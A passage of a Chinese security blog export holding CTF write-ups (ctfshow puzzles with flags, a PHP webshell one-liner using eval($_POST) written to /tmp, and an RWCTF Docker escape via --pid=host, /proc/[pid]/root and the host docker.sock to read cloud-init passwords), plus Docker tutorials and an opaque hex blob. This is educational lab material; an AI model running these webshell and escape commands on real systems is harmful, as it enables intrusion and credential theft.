Las Vegas历险记-2一点一点看视频比对就可以找到黄车了

ctfshow{TUX&amp;GOWN_36.1575,-115.1483}
Las Vegas历险记-3先找到车，然后观察周围环境，找到关键建筑（luxor金字塔，mgm酒店）谷歌地图很容易找到路口，但是还要注意时间节点是2017年

ctfshow{Mandalay_Bay_Rd}
红西秀林百度了半天，最后发现原剧中就有

ctfshow{强仔咸鱼_13912345670_8233333}
结语暂时写这么多吧，之后就不更新了。个人建议还是不要在这个模块上面花费太多精力^_^
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】月饼杯(第二届)-wp</title>
    <url>/posts/34a884e6/</url>
    <content><![CDATA[技术有限，只解出部分题目睡觉前还是前10的，一觉醒来就没了，呜呜呜:(
CRYPTO我的木头啊！！！根据提示为栅栏加密但不是普通的栅栏，而是W型解出来后就是base全家桶了
一封信网站直接一把梭，密钥在题目中
MISC杂项签到在图片的最后有一串base64加密的字符串，解码即可
有手就行图片备注中得到关键信息汉明码不会算参考文章
HelloFlag第一次做这种区块链的题目感觉是非预期了首先下载MetaMask这个插件打开网址将地址替换为题目中的点这个（我瞎点的）查看更多信息转成UTF-8就能看到flag了
project Tao-1太套了吧log中并没有任何有用的信息就不放出来了第零关：&#x2F;W4lc0me  没啥好说的，直接下一关第一关：&#x2F;Letsstart 源码里有第二关：&#x2F;some_informations 根据提示找到错误，那就是去掉s第三关：&#x2F;some_information 有色块，转成asciiG0od! Next /CTFG0d第四关：&#x2F;CTFG0d 有一串加密字符串，先base64–&gt;base16–&gt;base64–&gt;base32,得到ecalptx4N/ 反转一下/N4xtplace第五关：&#x2F;N4xtplace 源代码中的颜文字aaencode解密一下第六关：&#x2F;cftla5gsh0w title的提示去掉flag第七关：&#x2F;ct5sh0w 源码中有一张二维码，修复一下第八关：&#x2F;t308g0d 一张图片，下载后改高度（原来crc没报错的情况下高度不一定正确（8神说高度和IHDR块的CRC都被改了））
project Tao-2第九关：&#x2F;DEADSOUL就是第八关的图片名字
第十关：&#x2F;HIRE提示知乎彩蛋在console可以找到
第十一关：&#x2F;about_baidulog提示说访问图片找到图片的RGB值和alpha值（就是ps中灰度滑块的值）即14.215.117.35，访问是百度首页根据提示找到地址
第十二关：&#x2F;ns在地图上将诗句中的地名连接起来组成两个字母ns
第十三关：&#x2F;ONLY2GAME根据log，发现是莫斯密码将SAYL7UNIT用莫斯加密然后-和.互换再次解密
第十四关：&#x2F;TAOFINAL5bit编码——&gt;博多密码在线解码将.换成0，-换成1
最终：flag在图片最后面
月饼起义第一次出题目，有点激动，哈哈哈感谢@rot的出题协助
1：首先下载，得到一个压缩包，但是不能直接解压，是损坏的可以看到有一个hint.txt尝试用binwalk分离查看这个文本是零宽隐写解出来一个hint：170，哎但是暂时没啥用
2：再回去查看压缩包会发现中间隐藏了一个文件提取出来后异或之前得到的数值170脚本如下：
f=open(&quot;data&quot;,&quot;rb&quot;)d=f.read(9999999)e=&quot;&quot;for i in d:    e=e+chr(ord(i)^170)f=open(&quot;data_xor&quot;,&quot;wb&quot;)f.write(e)f.close()
观察到有89 50 4e 即png图片头逆序脚本：
f=open(&quot;data_xor&quot;,&quot;rb&quot;)d=f.read(9999999)d=d[::-1]f=open(&quot;flag.png&quot;,&quot;wb&quot;)f.write(d)f.close()
然后使用stegsolve 查看通道信息得到最终的flag图片
OSINT幸福小镇百度百科可以看到所有信息，角色，配音等都在里面
PS打卡第一天先改后缀为psd把4张图片导出百度识图搜冬天这张看到了域名为兰州大学直接交试试看，没想到真是兰州大学
抬头看看直接老朋友谷歌识图找到几篇新闻，都是近期发生的在新闻中得到关键信息The lvy餐厅谷歌地图实景看看嗯，一模一样，剩下的就不说了
以卵击石通过百度识图得到的图片猜测大概是个柠檬的外表直接在b站搜一个一个看拿到制作的视频（甜点的售价_内层馅料的种数都在视频中）通过评论区的关键词（请吃饭，蹭饭），翻看“雨哥到处跑”和“力元君”的往期视频，可以发现有一期（蹭饭挑战）提到了这个柠檬拿到视频号组合一下就好啦
我的朋友暴打出题人，啊啊啊啊这一题我前前后后做了4个小时左右，一直组合不对，最后发现顺序错了根据提示，猜测人物为LOL的解说lol解说大部分活跃在微博直接微博搜索英雄联盟主持人得到几个人物（余霜，小钰，骆歆）在她们的微博中翻与图片一致的衣服最后在骆歆的微博中找到了时间，战队等信息搜一下赛程表在搜战绩接着是第二场比赛战绩组合在一起
套套去哪儿根据提供的信息（2021年6月3号下午和图片中的机型B-6467）在飞常准app中可以查到如下信息西藏航空 TV9817 13:00-15:30 拉萨贡嘎T2-泸州云龙西藏航空 TV9817 13:00-17:55 拉萨贡嘎T2-太原武宿T1西藏航空 TV9817 16:00-17:55 泸州云龙-太原武宿T1
深圳航空 ZH3721 13:00-15:20 拉萨贡嘎T2-泸州云龙深圳航空 ZH3721 13:00-17:55 拉萨贡嘎T2-太原武宿T1深圳航空 ZH3721 16:00-17:55 泸州云龙-太原武宿T1
长龙航空 GJ5039 13:00-15:20 拉萨贡嘎T2-泸州云龙长龙航空 GJ5039 13:00-17:55 拉萨贡嘎T2-太原武宿T1长龙航空 GJ5039 16:00-17:55 泸州云龙-太原武宿T1
接下来就不会了，然后一个一个航班查，一个一个城市试，结果还真蒙对了
见字如面赛后做出来的hint1:想想是哪些人收到信呢，信字加粗一下hint2:以写信收藏体育娱乐以及其他明星为主真没有想到在贴吧，学废了百度识图得到人物名字：山姆在吧内搜索在他的其他帖子里找到了qq
webweb签到MD5等于自身，如md5($a)&#x3D;&#x3D;$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017
不要离开我在可写的&#x2F;tmp目录下传木马并写系统命令，然后提交5秒内进⾏check，check会关闭nginx和php-fpm，由于是www-data权限，⽆法启动nginx和php-fpm，直接启动php内置服务器即可
cmd=file_put_contents(&quot;/tmp/index.php&quot;,&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;);system(&quot;sleep 5 &amp;&amp; php -S 0.0.0.0:80 -t /tmp/&quot;);
注意特殊字符编码传入后可以在蚁剑看看有没有成功写入phpflag在根目录（出现Notice: Undefined index: a in /tmp/index.php on line 1是正常情况）
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】群友挑战-wp</title>
    <url>/posts/37dc4cfa/</url>
    <content><![CDATA[CTFshow福利抽奖好家伙，打开容器就是flag，但是群主把提交的框隐藏了
观察URL中的数字，发现这一题的value是1089
打开其他任意一题，修改challenge-id的value值，提交成功
损坏的文件stegsolve一把梭，另存为png文件，flag就在图片上
寻找坐标
这张图片里面隐藏了NASA的发动机实验室坐标，你能找出来吗？


坐标请删除非字母和数字的符号，字母全部大写 flag格式为ctfshow{NASA发动机实验室坐标}

直接谷歌到坐标
富婆我来了根据提示，在群文件下载文件
将附件内容与群文件内容一一对应，找到中文即可

214,1—&gt;我221,7—&gt;也233,35—&gt;想15,45—&gt;找65,67—&gt;三57,37—&gt;十115,27—&gt;六229,8—&gt;迪232,27—&gt;的101,48—&gt;富124,94—&gt;婆

FW我来了notepad++或其他编辑器打开
[&#123;000214A0-0000-0000-C000-000000000046&#125;]Prop3=19,2[InternetShortcut]Modified=63746673686f777b666c61675f69735f6c6f76657dIconFile=C:\WINDOWS\system32\SHELL32.dllIconIndex=10IDList=URL=https://ctf.show/

将modified的值转字符串即可
病毒我来了解压后直接用010或者strings可以看到flag就在最后，不过是16进制的，转成字符串即可
我是一个复读机MD5等于自身，如md5($a)&#x3D;&#x3D;$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017
解题姬02很有意思的一题
使用mumuzi解题姬脚本自动解题
from mumuzi import mumuzitaoshen=mumuzi()f=&#x27;flag.tao6000000&#x27;for i in range(60000):    taoshen.talk()    f=taoshen.solve(f)


得到一个flag.layer5999880
取出其中的rar文件，在注释中发现hint

找到文件的修改时间为2021/10/23 7:08
往前推一个月就是2021/09/23
在pypi上找这天的版本，有0.1.0-0.1.4五个版本
最终在0.1.3版本的taoshenyulu.py得到flag
TH185一脸懵逼，完全看不懂题目，二刺螈浓度太高了
在题目给出的wiki中爆破+猜 拿到flag（因为例子给的是CLASSICLAGER，那就爆破类似的字符串，得到ASAHIMARUEFU）

未完待续。。。
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>Be-a-Docker-Escaper-4 &amp; Be-a-Cloud-Hacker</title>
    <url>/posts/90615d01/</url>
    <content><![CDATA[
题目来自2024年第六届RWCTF体验赛

一道关于容器逃逸的题目
Be-a-Docker-Escaper-4ssh连上后可以通过ps -aux命令看到这个容器的启动命令
docker run --rm -it --pid=host --security-opt=apparmor=unconfined ubuntu bash


这里介绍下--pid=host这个参数，指定为host后会使用宿主机的pid namespace。可以通过ps命令看到容器外的进程
--pid=&quot;&quot;  : Set the PID (Process) Namespace mode for the container,             &#x27;container:&lt;name|id&gt;&#x27;: joins another container&#x27;s PID namespace             &#x27;host&#x27;: use the host&#x27;s PID namespace inside the container


因为容器共享了pid，并且关闭了apparmor，所以可以利用某些进程的/proc/[pid]/root符号链接实现容器逃逸
先找到宿主机上以非 root 用户运行的进程很明显有个sleep进程

然后在容器中创建一个 UID 和 GID 与目标进程 UID 和 GID 相同的用户这里的uid很明显是1000，gid则需要猜测（基本从1000开始，这一题中是1001）

最后用 su 命令切换到该用户，就有权限访问目标进程的 &#x2F;proc&#x2F;[pid]&#x2F;root 了

非预期解法
for fd in `find /proc/*/root`; do ls -al $fd | grep \&gt;; done



Be-a-Cloud-Hacker先提升权限
创建特权容器
apt updateapt install docker.io# cat /proc/$pid/root/etc/group得到gid为1000，将原来的替换成1000sed -i &#x27;s/docker:x:103:/docker:x:1000:/g&#x27; /etc/groupusermod -aG docker expsu exppid=$(pidof sleep)docker -H unix:///proc/$pid/root/run/docker.sock run -it --privileged ubuntu bash

在特权容器中逃逸
mkdir /tmp/mmount /dev/sda1 /tmp/m

最后找cloud-init的配置文件中的密码就行了（默认在&#x2F;var&#x2F;lib&#x2F;cloud）


参考文章：一个未公开的容器逃逸方式
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>容器编排及环境部署</title>
    <url>/posts/145ae3c2/</url>
    <content><![CDATA[Dockerfile和docker-compose.yml的区别DockerfileDockerfile是一个按一定规则编写的包含多行命令的文件，使用Dockerfile可以快速的构建一个定制的镜像。
docker-compose.yml使用docker-compose.yaml文件，按照特定的语法语句编写指令，管理多个镜像的部署和端口等操作，实现真证的快速部署。在不同服务器上部署时，只需要一个docker-compose.yaml文件，便能完成应用的部署操作。总之，Docker Compose是用来管理多个容器的。
安装docker-composecurl -L &quot;https://github.com/docker/compose/releases/download/1.25.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose     //下载docker-composechmod +x /usr/local/bin/docker-compose        //赋予执行权限docker-compose -version    //查看版本信息&amp;是否安装成功

Compose模板文件Docker-Compose标准模板文件应该包含version、services、networks 三大部分，最关键的是services和networks两个部分。
version: &#x27;2&#x27;services:  web:    image: dockercloud/hello-world    ports:      - 8080    networks:      - front-tier      - back-tier  redis:    image: redis    links:      - web    networks:      - back-tier  lb:    image: dockercloud/haproxy    ports:      - 80:80    links:      - web    networks:      - front-tier      - back-tier    volumes:      - /var/run/docker.sock:/var/run/docker.socknetworks:  front-tier:    driver: bridge  back-tier:    driver: bridge
下面解释几个常用的命令
versionCompose目前有三个版本分别为Version 1，Version 2，Version 3，Compose区分Version 1和Version 2（Compose 1.6.0+，Docker Engine 1.10.0+）。Version 2支持更多的指令。Version 1将来会被弃用。
imageimage是指定服务的镜像名称或镜像ID。如果镜像在本地不存在，Compose将会尝试拉取镜像。
build服务除了可以基于指定的镜像，还可以基于一份Dockerfile，在使用up启动时执行构建任务，构建标签是build，可以指定Dockerfile所在文件夹的路径。
比如当前目录下有Dockerfile，docker-compose.yml 文件
就会在当前目录下寻找Dockerfile文件进行自动构建镜像，然后使用镜像启动服务容器。
portsports用于映射端口的标签。
volumes数据卷，在它下面可以定义的数据卷（名字等等），然后挂载到不同的服务下去使用
networks应用的网络，在它下面可以定义应用的名字、使用的网络类型等等
Compose常用命令docker-compose up：启动服务，如果在后台启动需要参数-ddocker-compose stop [name]：停止服务docker-compose start [name]：启动服务docker-compose rm [name]：删除服务，需要停止服务，否则使用-f参数，与docker rm命令类似docker-compose down：停止并删除容器，网络，镜像和数据卷docker-compose logs -f [name]：查看具体服务的日志
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>构建docker镜像并上传至hub</title>
    <url>/posts/6a4ce58/</url>
    <content><![CDATA[使用Dockerfile构建容器学习Dockerfile的最好方式就是阅读别人写的Dockerfile，遇到不会的指令就查一查Dockerfile的文档
文件结构Dockerfile 一般分为 4 部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，“#”为 Dockerfile 中的注释。Dockerfile 主要指令如下：
FROM：指定基础镜像，必须为第一个命令。MAINTAINER：维护者信息。RUN：构建镜像时执行的命令。ADD：将本地文件添加到容器中，tar 类型文件会自动解压（网络压缩资源不会被解压），可以访问网络资源，类似 wget。COPY：功能类似 ADD，但是是不会自动解压文件，也不能访问网络资源。CMD：构建容器后调用，也就是在容器启动时才进行调用。ENTRYPOINT：配置容器，使其可执行化。配合 CMD 可省去“application”，只使用参数。LABEL：用于为镜像添加元数据。ENV：设置环境变量。EXPOSE：指定与外界交互的端口。VOLUME：用于指定持久化目录。WORKDIR：工作目录，类似于 cd 命令。USER：指定运行容器时的用户名或 UID，后续的 RUN 也会使用指定用户。使用 USER指定用户时，可以使用用户名、UID 或 GID，或是两者的组合。当服务不需要管理员权限时，可通过该命令指定运行用户。ARG：用于指定传递给构建运行时的变量。ONBUILD：用于设置镜像触发器。
接下来以 centos:latest 为基础镜像，安装 jdk1.8 并构建新的镜像 centos-jdk。例：
# CentOS with JDK 8# 指定基础镜像FROM centos# 指定作者MAINTAINER lewiserii# 新建文件夹用于存放 jdk 文件RUN mkdir /usr/local/java# 将 JDK 文件复制到镜像内并自动解压ADD jdk-8.tar.gz /usr/local/java/# 创建软链接RUN ln -s /usr/local/java/jdk1.8.0_281 /usr/local/java/jdk# 设置环境变量ENV JAVA_HOME=/usr/local/java/jdkENV JRE_HOME=$&#123;JAVA_HOME&#125;/jreENV CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libENV PATH=$&#123;JAVA_HOME&#125;/bin:$PATH

构建镜像新建一个目录，然后在新目录下新建一个Dockerfile（注意D要大写）放入jdk的压缩包将你写好的内容复制进Dockerfile文件使用build构建镜像

docker build -t centos-jdk8:v1.0 .


其中-t centos-jdk:v1.0表示打包的镜像名为centos-jdk，tag为v1.0（tag是可以任意命名的，不一定要是这种格式），注意命令的最后有一个.，这个表示打包的上下文（其实就是Dockerfile所在目录）是在当前目录，然后目录下的Dockerfile就会被编译执行。
执行完毕后运行docker images就会发现多了一个centos-jdk镜像。

可以先运行一下容器查看效果

上传至docker hub1:首先需要在官网创建一个账户
2:在docker中登陆

docker login -u 用户名 -p 密码


3:将镜像命名你的用户名&#x2F;镜像名这种形式，不然会push认证不通过

docker tag xxx:xxx 你的用户名&#x2F;镜像名


4：上传

docker push 你的用户名&#x2F;镜像名


5：登陆官网查看镜像信息在首页就可以看到啦，这样你就可以向你的朋友们分享你的镜像了
6：删除hub镜像进入镜像后在settings中可以找到delete repository选项
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>hw面试题</title>
    <url>/posts/2109a2ab/</url>
    <content><![CDATA[
  c37edc3dc388221caed397fda20028d36daa6dd1ff1b84bf39c2e63ab44a02e59ee735051a450fd837e89d87cc323c94e30a690fac6bcedd847ae5f62950a31a717f8b51d3dc9a3bf238cecff73ca72c2c5a246425080e80af109f9463fd8c8e48720f34c71d7e7be8c89c02ccc101b1d31d963ad3a2319ae0999e3ed02826a0de7e211d808d8b38aed3208e7cbbefa3142a2cb31557cb42c3d3aabfaf73a62586198bca5e91ad57cc5327555b60b4bb11b132a3c96bc6444b831a21271b8abf5d4dc589c1ae642f97212045c5ecf8978f216ccdd86d631ecaa16af5c6ebca335d256f679d7f8d7acb8ba3f162a30a448d293feb86186480fa1b249e632dee9a09cee3b9ede7f0e25bb951db6cd7dc7d9ff5f2f98656dc39b2ae6b41443330c80505ffe8f9d3f5fc4f66afc28660b5e7378f723179cd54e38602c5b613ed43e2b584a6307d56521898750d4a6ac6958eb36b8557bdc3b1ba14cb430239c763014a37a9abf2ee546f23d05b9a70179199f9c5e4b1a880ca02bd39f2472d50602afe730dd8ef26abe40bd4c63c137eb33102540200112fa4c433970918af69efc93a4d246e517adc72650b6cf3f4ab27e7b47e0f9114d07d595fcf87b559f184e8d475a179e539f8cf67298f99d153a5d29e254430f252f44d34fcb4561a902f959045f1bfb8b87f511ed98625ede3f3bf3efead35bea2ed4da31bf33feff338f85eca82dfe5367c0993eee5cd07e85ce45a5ca3bd9b12e0dcce1ddf09cac47b96e81ae3401ad424df9a53aa5abf21418466e9cedfec248256dc332df16b9121d1d1e480f264cacb1d51b4a70248a1529882cb05d4997566f00c6afd2e10db2207e3ce54a52aaa8ceb9d3ddf457629754b4502ff511023fc9e505c59d0731f07ecd6590587b24cb06c7388646341660e576fa65c4b3868c3e774942c5791a2da435a167fc7eb1ce3a8302c9534b02022c4a85c1874b625524cce3dd3ac3debe7d26ab510d1852e29d6bdbe8132fc81fff648397ee7e29c0fc83921e17eada1e49a5b92430048f3517d587a793744979b0168b9bb98fb488ba1dbbf47df858c9ccddb01af7854da7c4a3fb583332f7402777574edb4ea846df6c59b6c879775ea8f09b3d86e3221836690605c9a3bde4c200bf655e500990e1c8591c11a52d48534990a09ce6be67f8f5961ef21818a2e259a4e5be6b3d0411f72a47aa5f14ef873a4d424e1a5ed9a8665ceda9f75fbf461b0a427cddbdef9868b5beed2a1034045f57928d858f2073b83da63411c0d9c236aded1c6a198017ce6c3a9456ca456847d57e014d6de63843e2f66d030696cb25a917b6b0ffd249a78dc6b1370796dcf090f4c2876b7affaf6849899eb9d1b5dd1df2ed45cf432394cba721f24c6a5d0b5de8dfa2330b7038035519d9c95da9c1dabe14b28a801608b9001f32d7229595e2f9a995bb5954d8ccce34ba78fcb123dfdb68f3ed8bb613896d0f4bf72934d4b53d7898d8ce62ec5522803ef7a8bbf35da2265cbea4af1cf1e633851510d0810d61a89034905e70f14c0e62bca69322e6f3aedb597e7746964dfcc0abd71aa2f5c1dc7c62ccf5c66559e8a87783078e6ce760a1eb8c46a3ac087d74ff60fff060151e4cb7fd8afe97a2b2463d077b240ab498583a351fb5bb5c71c8bc6db84e36bf07d5e7d7faf63bf0e9706389be6e9c7d42f993f0d581f7715340365065c4216d2665321dd029999567f476f4ea8c1f9ecc3ba9eaced969e041935f5ad2037c92631c2f4ff97ad742d12e413fc2a7c373a1a99f99943e71de1a455d7f2e63ad18d8501e897a31b5731ab15a1a98afde00ef7b603dfa4ecea3d7bfcb0b5a8dff29a584eaca3f46e9dbeccf20737a0e71b5ddbd90a5a466b8c9d8e242eb4b5e6122e39253a795dd0f415cb58eb4762520d3c8616e454550d7c77203f51b93b386784cb7badfdfacc1246a4af58b16a17763c374f56095780f0cc1f5c989d5142e35614e713923b658d85fffd8dd6a6790213172484472e4ed89da39b03a04a39f18e9b40f8a95ab9331555deffb7a2ac239d8668d53323093ac3edaa3fe62866f7570853467e84b51e94f6b8ca7319a320dd584e356ecfd4bd5e7e37a5065eee1667416d7a29aaf62521fa46ea558fe90ad8c177314d41c147bca0938b86560154408e366758fa51bc4fa662c40d0f574e24af0588537d9589b928e880a826ab4ace574d301345185e89807e42b0c6694b66d87b012a33daf4dd4fa1898d5b5a417990436c0a5f185d8e41b47311c934102a9d4bbd5ed25375c5957c4808b3c62f7406d4241a5284f3623afb99d6e2bc10cd149325541ca71ec1587b4bf7a0d29e5048465f5f7921d72099376206de69ee0830180acb7794d541b3580abe928274d61f0b9ecb02a98bb2a3ca632166afd38b381b948254e336934956f0d34f7dc28ed6461a5143edf70c45135cd3a8e01508c21e358c408711b79c2845cf4f830c09788aab10feb11a0936b7d57b59341c494e828a275d2a15e852e10a840fa5eedb5c310e10264b0423ee8b95adf7ed0b61a7337af90575e00607f4368f54fadd0ec2eba7414fac927f8db6c6c23bb6d523ed173e5a1d2adc13e23180ae879120e6f2ec08d1b0d6f433ba5e9e03fdb40e352dcb6ea159c02fc4d757d609c5b52431629e13bc685b14b5d33652fd7cb3848bd7a0f0d9c19b79df66f160097663f0b48671a8f326a9904d01d0cf8a537e31c415cddd3d3159dbf8635738301e59eee88586acd062319bc2b403bf3082c2aafc1f60a3af3f1fe0f8e3927e7cf9077fc0d7a230bf4264314a21767a168df3458d4903e6d4b716644898171fe3280a6ddecc43d2be238ceb4bc95d055b1d2858ca0ea9efb9dbbe47dea2373a275dd49f6b8151fdec79ee589410571c67153857f694c98fdbad9e741582a1e0a9ff40d777496e185ce7ea5baa0f6259e4c0877b26de878320022ceab14bc779edaa7f38bd8a9eebc7334e2fdee233abc6a424a3fcb976f6c8778adc9e215ce6ff7a98bae41ee091c42175f6a29ccdec23dba621891698255df0c83ffe926196e12a393387b3aec12bfed80c61aa1e88da0eb04301bbb0921743a276b75a71be181ce96d01030c63725dd54d9ae8eb5b75e826c309dee65f10ed54f1e3d81f4bff48eb2d23371197d60d32d9fc744337ad992a8fe54f8a3b0bec62c3a791a4c23d6408b4bd4393d537a7f18cb7d53877aa55a7a5cf9266ea9ee6a36dff17a7d964b9bb41187be56328066ea18d54e3bab0d072462e11d1260526c04351343a1f42f4d47cde1ecea662765629d4ea260a820a15d50b1f03aafcde5979cbce434c0fa9a4db4913e2bcb72479e2eb68f097f3621dac13a58c63fcdf0024cad0cbe34a446be3aa8be9786dd0d2c504810d04ae34669b4677c2404b357fe02309e4c2a050e21b85dda80e66d2d35996493b1f3c379649760ab137bd6ee508cfdc57ff1a00e97c3d7466ea133ec840a26714aa23a0e1c275e3309776b70d87331c6b7f97dd90c3ef1d70903ad861fba7b7d1a5601a9eaedc04d9c040dfda2a719b1c1e7b6450aebc0131d18e41ba83375526cb31c86637c2f23d866d8cee84f9ce035aef57ed9330bc1a15665467bb786e618373084d918ec87e4c0b4411311f70b16e015d6b7cdf971a88b95391e91c3f27e918fc0246e2e20e719b786efdc0137cc1b3b82fe8d4e5324f4d512cc102d53965691cc6d4ceea6c06cb238a9c2591c633c1814781e1de3efa81ecb0bfe1db99a34a62d3ad4c5fbe2856e5c34925a1c0f1caa02c8404473c1d238f3b33a88b5d7fb695e6482f1d955b371b02c46af29d7bb80b7a4fd9ce51c93d75a1ef140b93316246a3dc111e83de6825292166ff7bfb9c0ab59fa7e82b61d2a6aca694cbba1caef3cfff9dd117638126c0c9ca47491b40b462976ee60d9daa545a068ee1593f9e154e598c0245d3a1f7a0f5765726ec8a5957002d16e035264d3c86d0c178df0dbba7b869c3f7f0e6c560f4aab3c3cf3b3a9d724e6dd56944ad79e731879a77418d7bef713669fa830efcc68f9325268733407857d7a114399e111a2b3b97cfdb7709c031e6d58501c8610495a9ba9560038d27342f395a93b3ed7f065cabf04e0660c6bbbf5e009c2f2c5894e6d0a8226a929b2cee2653dbe18f651b57047a8070d19471addcc70982fde0b633fd5dd62782482b9df58cd5a6a1229f31804a3020242588791a0fb18ecd091ac3678c7ab2f647dbb9b35a0a381db633931dedb99fd24b8e9d12179112609cf89b6490302eceed8ae1998037f7660b31f25d0a1e3c8ebc96c434fa0ef43b7512ace6d2db5260aa606e466eb9ab04f553fb820711c74446f3d34a8461cbfcb36ad86074e42af0a99a34bfb0bdf22495e70ddfc5648a8dfa1dad5a22fce1aa6497c9221affbf4830630c0f95f2fa02bad086211d4226943d06c2df2de39c25223046861e8808bcf7f000e4962d172c3669555e234d075394c820dc808e25cbda49d76a854893c9ee99c1a05b8dd5378ed3c02b2968f34ee79a3d25238778f46c6b143820ad7a9d1ae65689578db5dd1578a396ac6b96d8e2723884bd2a276da21c980455fca50857556bbe94a4cdaf15a1a55cd075932ae97bb96ac03e039aa9d30a8df85e05d4e7191de4d96c1cc7da9520bf42b60e98230e2cd2eb3b51714d8c93de0be1b4f6c48c6004611acfc72f066157bae3c60301763d7a2e772e630372b0dd52a8e1391c69d401e0218b7c1ac747f2eed97b1e1a1c608a9c342572025947a72fed479ed96f23a7c8f49edb40aa3c0c44e137811e797f2d95f95299830af4bc1fcae202836b6b3e6faf9d2e594314551413adaaad95ea9868897bc32275667d2557a9dd57211c9f5448b67c610026bada67e1c1104ddd4b6812a88a4b37c31913939c8d77aa98592ed5b3ff9e159b64915e2682fc9392858e39519870c7b41e5d6cf7bd7c36e024c58320b022d3e293d9b90762aa9e6455a9f95c85914ba232ce7b11ac9dfffb6731e27714135b5a586129ed6d2a5f63450673c81037ae1140b0fcce451b9ccc8591fc525eddca4bd2b4e9c9e57b0ad98bd81501a03e1a33ceb107b13b77f1e86a577cf613278e1185ff6343d81b3495b9e1f702e622664014ae38fba5439915529c89189a9c17e30d1c04172bec2b3ba4cb30cf6c7e186ca315bf2a42a7c6591e4767e0b7d94ad68017db01d947a93d580ddaadcb8c278d9991774d32fcae538cc6f9bf6a631b0d98f6a59773338d44ee8ad559f4d83d740b2314bf20877cddd5f010d23a6ad50665e5f3df6c318a3cb4ea97f12c286fad64898446ca0535f325141acba591098eb4621161f6988503625699549db372b562a850f369710d0ece73c53ac52d3eb893ceb5ae44e65e6e6d0d3f6d74b5a5a160008ec7e05d900e7f2d3925ae60a49ba4dffec77db530ebfb3be5c1717850fc8802a66c5e10d045f626fc9c5d2599ac76b753abd3cf7fb2ade7c6733b6a08d43a8999f6b04f55ee244ed2bf0f85798f3355fe074fcb75ced7d4428e441dfac50aed6227739b802c85d034a192c8e446cd431e847a4d9f395de23cebbbecfa5a8fd980da59bd4f70ea75f72ea37475466c622370e190a2ab2e47b9222ec23f3f0485bcd8548ec41c750457276b13e81ffeb90b7d04bb699998021e6207f0ea5710799e9fae8bc72c076636e78117f34709c1514cb3aaa60ec2946946960c4dcaacea447a87feb86332cd7e60678e08e804dceed656e11449ad863897d0349f6edfdb22ba5584c1e2406055a015516ec39ae31e0c09aeeb76333eac7b26d20229045f7da3ff15f610d5ab87a040e071ffe577eeeac1e3e0ccf316aad4b6b85a06fa936d5bea3248e02d4fc76bec325fec20eb40f423f4b2bcb212dec63125515aa63f3665287120e7433e2448ace0267723ac1c9300955ea65b67bee68ba432fca4fe4ec0e86aceaaca72f457255802cab903dc0ffa7089de91b7194f92ab3df5a7a3422722d3a2feb0b4331fdc547ec672e0980bb17beddc250e76c8f87e2171f38f62803943715f16b2b51c6d99d47f520f42a9000295332c058474fcbd3c3a78d53190a0075ce65ed089869e985f70830d0172695920a2291bc8364a8e0c6d404fbeb332bc3d8307905ac64f7f401743e71722982fabedac8d95696916804f2ffd9af4cb742994a9f0d149c93e964cb7388dc4ec700d36b1d2b139ac012ae611e028ecf0331499e7a5cb42b3ae8d901645f3d280e351005b6f85f06ea10d73e8d32c3633eb7434f703fc950707005ce88f6f21089666a723fbcd7ead836149cbc9afe91a39d5f56e8a73d2120d4e323be88384da11def55155fc4dace48499d7c7f97ee32bc16e362355d259421559d1d9c58358415bdf54c3dce1a37e10d01806e5e7b5dc24fa1fba89628378b0acd78b80ffff809e4112ab026eab4700ee13e2967448296ba6feffcbefb579bc52a990a95e353b342fb322df5a4fa0c369e7fe57d4f1e3ea6b9e8a2b926c0940645c06b2282ca3f169a3b7586e6aaf9b7eb7ca8d4d56b8a234648695a237260c76973a54686fe93c3c6d12430012c704c3c4953f07242b5980e920529443e1bc9c0cbea119b70f92fb7dcea4f49f6abb7a8be9fe17f37f2a0df4814bf0753bb33b70399787fe321c9a0cfdcc2798936887bcc3f79a80dfd0fb86b1e2bf476b3830dcc919432f35c39e2016d950ef4836801e749d84a04dff451db3bd7448d2291b315a2de1bb8569a96d6dd05edf38ab32d86bfd4f4533804a4780e2ff198d4617dc6ddf08625ddb561739e93d8b7bf63fc932e418014bea070e02f18a720709173c7385b61ed37e07b5427a56a1af142bfee34e514cf37039e28f97e761121db6f6de0a70b2cc7679334db37a09e02f5434f253e79da1bcfc6414122bd82c3d8e27de92901a479bd89b4d119a4f169e5a461ecdaf61b025ee177b87d3d32d8f02bd7836e0bf392a38bbb285f8fd8317f8b4efadc2f9b627f7ae74e3f436b65777a78d31547ab5235b29012b294a52f3afafc30ae3153bd5b9404d1cbc5380b73ac988553517cad5069fba048fe320ddb9a1537983c32055fd54e0352a0c4444cfa918beb06a0a55ff094568658530f835a30011b5dc0717a79af26b0cf4e119ef67b39d5295ada7cfdc15dfceb696e0da88fe65a924ac41a4b3eeb3224dc95b06143b2ed33978fe4bc8e5091df8978cdf42397fbdf838a00b6d14ad66199f6088dfc99da9df0d39daad10af946e05160d8b1c1730bf1539f45b89c92c2457c5751923c0318a85f9e4a5834f975d391e95f1093316837f6e091fb9fe09ffc647acf31ca43ae8f611664ea3d81f657a6b22753e1fed5e6aea7bf2af6d34532e427530ca275f6ee6fe2a8cc26a5e17ba9ad5f801a23fd28f7934707cc70aaa7385983f93